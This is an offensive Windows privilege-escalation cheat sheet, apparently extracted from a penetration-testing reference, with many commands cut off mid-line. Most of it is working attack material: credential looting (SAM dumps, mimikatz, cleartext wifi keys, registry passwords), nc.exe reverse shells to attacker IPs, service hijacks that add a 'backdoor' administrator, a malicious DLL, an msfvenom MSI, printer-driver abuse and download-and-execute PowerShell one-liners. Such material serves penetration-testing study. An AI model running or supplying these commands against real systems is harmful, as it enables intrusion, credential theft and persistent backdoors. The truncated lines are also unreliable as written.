Meterpreter getsystem and alternatives
RottenPotato (Token Impersonation)
Juicy Potato (Abusing the golden privileges)
Rogue Potato (Fake OXID Resolver))
EFSPotato (MS-EFSR EfsRpcOpenFileRaw))
EoP - Privileged File Write
DiagHub
UsoDLLLoader
WerTrigger
WerMgr
EoP - Common Vulnerabilities and Exposures
MS08-067 (NetAPI)
MS10-015 (KiTrap0D)
MS11-080 (adf.sys)
MS15-051 (Client Copy Image)
MS16-032
MS17-010 (Eternal Blue)
CVE-2019-1388
EoP - $PATH Interception
References

Tools
PowerSploit's PowerUp

powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadS

Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock
(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local
privilege escalation vulnerabilities
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File

BeRoot - Privilege Escalation Project - Windows / Linux / Mac
Windows-Exploit-Suggester

./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7

windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation
Vectors on Windows Systems
WindowsExploits - Windows exploits, mostly precompiled. Not being updated.
WindowsEnum - A Powershell Privilege Escalation Enumeration Script.
Seatbelt - A C# project that performs a number of security oriented host-survey "safety
checks" relevant from both offensive and defensive security perspectives.

Seatbelt.exe -group=all -full
Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168

Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs
(legacy Windows) in mind
JAWS - Just Another Windows (Enum) Script

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAW

winPEAS - Windows Privilege Escalation Awesome Script
Windows Exploit Suggester - Next Generation (WES-NG)
# First obtain systeminfo
systeminfo
systeminfo > systeminfo.txt
# Then feed it to wesng
python3 wes.py --update-wes
python3 wes.py --update
python3 wes.py systeminfo.txt

PrivescCheck - Privilege Escalation Enumeration Script for Windows

C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Ex
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Re

Windows Version and Configuration
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

Extract patchs and updates

wmic qfe

Architecture
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

List all env variables
set
Get-ChildItem Env: | ft Key,Value

List all drives

wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft N

User Enumeration
Get current username
echo %USERNAME% || whoami
$env:username

List user privilege
whoami /priv
whoami /groups

List all users
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name

List logon requirements; useable for bruteforcing

net accounts

Get details about a user (i.e. administrator, admin, current user)
net user administrator
net user admin
net user %USERNAME%

List all local groups
net localgroup
Get-LocalGroup | ft Name

Get details about a group (i.e. administrators)
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource

Get Domain Controllers
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

Network Enumeration
List all network interfaces, IP, and DNS.
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

List current routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

List the ARP table
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

List all current connections
netstat -ano

List all network shares
net share
powershell Find-DomainShare -ComputerDomain domain.local

SNMP Configuration
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

Antivirus Enumeration
Enumerate antivirus on a box with WMIC /Node:localhost
/Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName

Default Writeable Folders
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog

C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp

EoP - Looting for passwords
SAM and SYSTEM files
The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The
user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM
hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on
HKLM/SAM.
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

Generate a hash file for John using pwdump or samdump2 .
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt

Either crack it with john -format=NT /root/sam.txt , hashcat or use Pass-The-Hash.

HiveNightmare
CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in
Windows 10 and 11 as a non-administrator user
Check for the vulnerability using icacls

C:\Windows\System32> icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Users:(I)(RX)
<-- this is wrong - regular users should not hav

Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives
from it.
mimikatz> token::whoami /full
# List shadow copies available
mimikatz> misc::shadowcopies

# Extract account from SAM databases
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windo

# Extract secrets from SECURITY
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\W

LAPS Settings
Extract HKLM\Software\Policies\Microsoft Services\AdmPwd from Windows Registry.
LAPS Enabled: AdmPwdEnabled
LAPS Admin Account Name: AdminAccountName
LAPS Password Complexity: PasswordComplexity
LAPS Password Length: PasswordLength
LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled

Search for file contents
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*

Also search in remote places such as SMB Shares and SharePoint:
Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for
referencing issue see: https://tinyurl.com/28xlvo33/pull/6)

# First, retrieve a token
## Method 1: using SnaffPoint binary
$token = (.\GetBearerToken.exe https://tinyurl.com/2akdbt52)
## Method 2: using AADInternals
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Te

# Second, search on Sharepoint
## Method 1: using search strings in ./presets dir
.\SnaffPoint.exe -u "https://tinyurl.com/2akdbt52" -t $token
## Method 2: using search string in command line
### -l uses FQL search, see: https://tinyurl.com/2bjwhhsu
.\SnaffPoint.exe -u "https://tinyurl.com/2akdbt52" -t $token -l -q "filename:.config

Search passwords in SMB Shares: SnaffCon/Snaffler

Search for a file with a certain filename
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

Search the registry for key names and passwords
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Aut
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | finds
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy creden
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Passwords in unattend.xml
Location of the unattend.xml files.
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml

*unattend.xml *unattend.txt 2>nul .

Example content

<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" la
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
$userAdministrateur</Username>
</AutoLogon>
<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>

Unattend credentials are stored in base64 and can be decoded manually with base64.
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="
SecretSecurePassword1234*

| base64 -d

The Metasploit module post/windows/gather/enum_unattend looks for these files.

IIS Web config

Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction Sile

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

Other files
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system

%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b

Wifi passwords
Find AP SSID
netsh wlan show profile

Get Cleartext Pass
netsh wlan show profile <SSID> key=clear

Oneliner method to extract wifi passwords from all the access point.

cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "

Sticky Notes passwords
The sticky notes app stores it's content in a sqlite db located at C:\Users\
<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalSt
ate\plum.sqlite

Passwords stored in services
Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using
SessionGopher

https://tinyurl.com/2cdzl9hw
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss

Passwords stored in Key Manager
:warning: This software will display its output in a GUI
rundll32 keymgr,KRShowKeyMgr

Powershell History
Disable Powershell history: Set-PSReadlineOption -HistorySaveStyle SaveNothing .

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHo
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Consol
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw

Powershell Transcript
C:\Users\$user\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt

Password in Alternate Data Stream
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag

EoP - Processes Enumeration and Tasks
What processes are running?
tasklist /v
net start
sc query

Get-Service
Get-Process
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv

Which processes are running as "system"
tasklist /v /fi "username eq system"

Do you have powershell magic?

REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellV

List installed programs

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,Last
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

List services
net start
wmic service list brief
tasklist /SVC

Enumerate scheduled tasks

schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas

Startup tasks
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

EoP - Incorrect permissions in services

A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP.
You can replace the binary, restart the service and get system.
Often, services are pointing to writeable locations:
Orphaned installs, not installed anymore but still exist in startup
DLL Hijacking
# find missing DLL
- Find-PathDLLHijack PowerUp.ps1
- Process Monitor : check for "Name Not Found"

# compile a malicious dll
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dl
# content of windows_dll.c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
if (dwReason == DLL_PROCESS_ATTACH) {
system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
ExitProcess(0);
}
return TRUE;
}

PATH directories with weak permissions

$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe

$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.tx

Alternatively you can use the Metasploit exploit :
exploit/windows/local/service_permissions

Note to check file permissions you can use cacls and icacls
icacls (Windows Vista +)

cacls (Windows XP)
You are looking for BUILTIN\Users:(F) (Full access), BUILTIN\Users:(M) (Modify access) or
BUILTIN\Users:(W) (Write-only access) in the output.

Example with Windows 10 - CVE-2019-1322 UsoSvc
Prerequisite: Service account

PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\driv
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.
PS C:\Windows\system32> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
TYPE
: 20 WIN32_SHARE_PROCESS
START_TYPE
: 2
AUTO_START (DELAYED)
ERROR_CONTROL
: 1
NORMAL
BINARY_PATH_NAME
: C:\Users\mssql-svc\Desktop\nc.exe $ip 4444 -e c
LOAD_ORDER_GROUP
:
TAG
: 0
DISPLAY_NAME
: Update Orchestrator Service
DEPENDENCIES
: rpcss
SERVICE_START_NAME : LocalSystem
PS C:\Windows\system32> sc.exe start UsoSvc

Example with Windows XP SP1 - upnphost

# NOTE: spaces are mandatory for this exploit to work !
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost

If it fails because of a missing dependency, try the following commands.
sc config SSDPSRV start=auto
net start SSDPSRV
net stop upnphost
net start upnphost

sc config upnphost depend=""

Using accesschk from Sysinternals or accesschk-XP.exe - github.com/phackt
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
SERVICE_ALL_ACCESS
RW upnphost
SERVICE_ALL_ACCESS
$ accesschk.exe -ucqv upnphost
upnphost
RW NT AUTHORITY\SYSTEM
SERVICE_ALL_ACCESS
RW BUILTIN\Administrators
SERVICE_ALL_ACCESS
RW NT AUTHORITY\Authenticated Users
SERVICE_ALL_ACCESS
RW BUILTIN\Power Users
SERVICE_ALL_ACCESS

$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\Syst
$ sc stop <vuln-service>
$ sc start <vuln-service>
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
$ sc stop <vuln-service>
$ sc start <vuln-service>

EoP - Windows Subsystem for Linux (WSL)
Technique borrowed from Warlockobama's tweet
With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell
on any port (no elevation needed). Don't know the root password? No problem just set the
default user to root W/ .exe --default-user root. Now start your bind shell or reverse.
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'

Binary bash.exe can also be found in C:\Windows\WinSxS\amd64_microsoft-windowslxssbash_[...]\bash.exe

Alternatively you can explore the WSL filesystem in the folder
C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_7
9rhkp1fndgsc\LocalState\rootfs\

EoP - Unquoted Service Paths
The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services
have a Path to its executable. If that path is unquoted and contains whitespace or other
separators, then the service will attempt to access a resource in the parent path first.
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {

Metasploit exploit : exploit/windows/local/trusted_service_path
PowerUp exploit

# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadSt
...
[*] Checking for unquoted service paths...
ServiceName
: BBSvc
Path
: C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName
: LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.

Example
For C:\Program Files\something\legit.exe , Windows will try the following paths first:
C:\Program.exe
C:\Program Files.exe

EoP - $PATH Interception
Requirements:
PATH contains a writeable folder with low privileges.
The writeable folder is before the folder that contains the legitimate binary.
EXAMPLE:
# List contents of the PATH environment variable
# EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
$env:Path
# See permissions of the target folder
# EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
icacls.exe "C:\Program Files\nodejs\"
# Place our evil-file in that folder.
copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"

Because (in this example) "C:\Program Files\nodejs" is before "C:\WINDOWS\system32" on the
PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will
run, instead of the legitimate one in the system32 folder.

EoP - Named Pipes
1. Find named pipes: [System.IO.Directory]::GetFiles("\\.\pipe\")
2. Check named pipes DACL: pipesec.exe <named_pipe>
3. Reverse engineering software
4. Send data throught the named pipe : program.exe >\\.\pipe\StdOutPipe
2>\\.\pipe\StdErrPipe

EoP - Kernel Exploitation
List of exploits kernel : [https://tinyurl.com/24sucrsp)
#Security Bulletin #KB

MS17-017
7/8)

#Description

[KB4013081]

CVE-2017-8464

#Operating System

[GDI Palette Objects Local Privilege Escalation]

[LNK Remote Code Execution Vulnerability]

(windows

(windows

10/8.1/7/2016/2010/2008)
CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability]
10/8.1/7/2016/2010/2008)

(windows

CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server
2012 R2)
CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008
SP2,2008 R2 SP1)
MS17-010 [KB4013389]
7/2008/2003/XP)

[Windows Kernel Mode Drivers]

(windows

MS16-135

[KB3199135]

[Windows Kernel Mode Drivers]

(2016)

MS16-111

[KB3186973]

[kernel api]

MS16-098

[KB3178466]

[Kernel Driver]

MS16-075

[KB3164038]

[Hot Potato]

(2003/2008/7/8/2012)

MS16-034

[KB3143145]

[Kernel Driver]

(2008/7/8/10/2012)

MS16-032

[KB3143141]

[Secondary Logon Handle]

MS16-016

[KB3136041]

[WebDAV]

MS16-014
...

[K3134228]

[remote code execution]

MS03-026

[KB823980]

(Windows 10 10586 (32/64)/8.1)
(Win 8.1)

(2008/7/8/10/2012)

(2008/Vista/7)
(2008/Vista/7)

[Buffer Overrun In RPC Interface]

(/NT/2000/XP/2003)

To cross compile a program from Kali, use the following command.
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c

EoP - AlwaysInstallElevated
Check if these registry values are set to "1".

$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEleva
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEleva
$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer

Then create an MSI package and install it.
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi

$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.ms
$ msiexec /quiet /qn /i C:\evil.msi

Technique also available in :
Metasploit : exploit/windows/local/always_install_elevated
PowerUp.ps1 : Get-RegistryAlwaysInstallElevated , Write-UserAddMSI

EoP - Insecure GUI apps
Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on
"Click to open Command Prompt"

EoP - Evaluating Vulnerable Drivers
Look for vuln drivers loaded, we often don't spend enough time looking at this:
Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to
bypass security controls and carry out attacks. The project helps security professionals stay
informed and mitigate potential threats.
Native binary: DriverQuery.exe
PS C:\Users\Swissky> driverquery.exe /fo table /si
Module Name Display Name
Driver Type
Link Date
============ ====================== ============= ======================
1394ohci
1394 OHCI Compliant Ho Kernel
12/10/2006 4:44:38 PM
3ware
3ware
Kernel
5/18/2015 6:28:03 PM
ACPI
Microsoft ACPI Driver Kernel
12/9/1975 6:17:08 AM
AcpiDev
ACPI Devices driver
Kernel
12/7/1993 6:22:19 AM
acpiex
Microsoft ACPIEx Drive Kernel
3/1/2087 8:53:50 AM
acpipagr
ACPI Processor Aggrega Kernel
1/24/2081 8:36:36 AM
AcpiPmi
ACPI Power Meter Drive Kernel
11/19/2006 9:20:15 PM
acpitime
ACPI Wake Alarm Driver Kernel
2/9/1974 7:10:30 AM
ADP80XX
ADP80XX
Kernel
4/9/2015 4:49:48 PM
<SNIP>

matterpreter/OffensiveCSharp/DriverQuery
PS C:\Users\Swissky> DriverQuery.exe --no-msft
[+] Enumerating driver services...
[+] Checking file signatures...
Citrix USB Filter Driver

Service Name: ctxusbm
Path: C:\Windows\system32\DRIVERS\ctxusbm.sys
Version: 14.11.0.138
Creation Time (UTC): 17/05/2018 01:20:50
Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust N
Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix System
<SNIP>

EoP - Printers
Universal Printer
Create a Printer

$printerName
= 'Universal Priv Printer'
$system32
= $env:systemroot + '\system32'
$drivers
= $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Curre

Copy-Item -Force -Path ($system32 + '\mscms.dll')
-Destination ($system3
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'
-Destination ($drivers
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers
Add-PrinterDriver -Name
'Generic / Text Only'
Add-Printer
-DriverName 'Generic / Text Only' -Name $printerName -PortName

New-Item
-Path ($RegStartPrinter + '\CopyFiles')
| Out-Null
New-Item
-Path ($RegStartPrinter + '\CopyFiles\Kiwi')
| Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')
-Name 'Directory' -P
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')
-Name 'Files'
-P
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')
-Name 'Module'
-P
New-Item
-Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -P
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'
-P
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'
-P
New-Item
-Path ($RegStartPrinter + '\CopyFiles\Mango') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Directory' -P
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Files'
-P
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango') -Name 'Module'
-P

Execute the driver
$serverName = 'dc.purple.lab'
$printerName = 'Universal Priv Printer'

$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.E
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName

PrinterNightmare

git clone https://tinyurl.com/24mzrkcj
PS C:\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
[<3] @Flangvik - TrustedSec
[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896
[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64
[+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4
[+] Adding printer driver => Generic / Text Only!
[+] Adding printer => EasySystemShell!
[+] Setting 64-bit Registry key
[+] Setting 32-bit Registry key
[+] Setting '*' Registry key

PS C:\target> $serverName = 'printer-installed-host'
PS C:\target> $printerName = 'EasySystemShell'
PS C:\target> $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $
PS C:\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
PS C:\target> Add-Printer -ConnectionName $fullprinterName

Bring Your Own Vulnerability
Concealed Position : https://tinyurl.com/2bvl5yz3
ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE
RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE
POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE
SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE
cp_server.exe -e ACIDDAMAGE
# Get-Printer
# Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
cp_client.exe -l -e ACIDDAMAGE

EoP - Runas

Use the cmdkey to list the stored credentials on the machine.
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator

Then you can use runas with the /savecred options in order to use the saved credentials.
The following example is calling a remote binary via an SMB share.
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"

Using runas with a provided set of credential.

C:\Windows\System32\runas.exe /env /noprofile /user:$user <password> "c:\users\

$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpassw
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e

EoP - Abusing Shadow Copies
If you have local administrator access on a machine try to list shadow copies, it's an easy way for
Privilege Escalation.
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
# List shadow copies using diskshadow
diskshadow list shadows all
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

EoP - From local administrator to NT SYSTEM

PsExec.exe -i -s cmd.exe

EoP - Living Off The Land Binaries and Scripts
Living Off The Land Binaries and Scripts (and also Libraries) : https://tinyurl.com/y6ct9yf9
The goal of the LOLBAS project is to document every binary, script, and library that can be
used for Living Off The Land techniques.
A LOLBin/Lib/Script must:
Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra
"unexpected" functionality. It is not interesting to document intended use cases. Exceptions
are application whitelisting bypasses
